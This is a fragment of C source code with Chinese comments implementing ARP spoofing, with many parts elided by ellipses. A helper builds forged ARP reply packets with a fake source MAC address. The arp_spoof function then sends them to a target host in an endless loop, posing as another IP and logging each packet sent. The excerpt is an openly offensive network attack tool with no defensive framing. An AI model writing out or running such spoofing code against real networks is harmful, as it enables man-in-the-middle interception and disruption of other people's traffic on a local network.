...
struct ether_arp *fill_arp_reply_packet(const unsigned char *src_mac_addr, const char *src_ip, const unsigned char *target_mac, const char *target_ip) {
    ...
    memcpy(arp_packet->arp_sha, src_mac_addr, ETH_ALEN);  // 使用伪造的源MAC地址
...
void arp_spoof(const char *if_name, const char *target_ip, const char *spoof_ip) {
    ...
    unsigned char fake_mac_addr[ETH_ALEN] = {0x01, 0x02, 0x03, 0x04, 0x05, 0x06};  // 自定义的伪造MAC地址
    char *src_ip;
    ...
    memcpy(eth_header->ether_shost, fake_mac_addr, ETH_ALEN);  // 使用伪造的源MAC地址
    memcpy(eth_header->ether_dhost, target_mac_addr, ETH_ALEN);  // 广播地址或目标MAC地址
    eth_header->ether_type = htons(ETHERTYPE_ARP);

    // 填充ARP包
    arp_packet = fill_arp_reply_packet(fake_mac_addr, spoof_ip, target_mac_addr, target_ip);
    ...
    while(1) {
        ...
        if (ret_len > 0)
            printf("ARP spoof packet sent to %s as %s with MAC %02x:%02x:%02x:%02x:%02x:%02x\n",
                   target_ip, spoof_ip,
                   fake_mac_addr[0], fake_mac_addr[1], fake_mac_addr[2],
                   fake_mac_addr[3], fake_mac_addr[4], fake_mac_addr[5]);
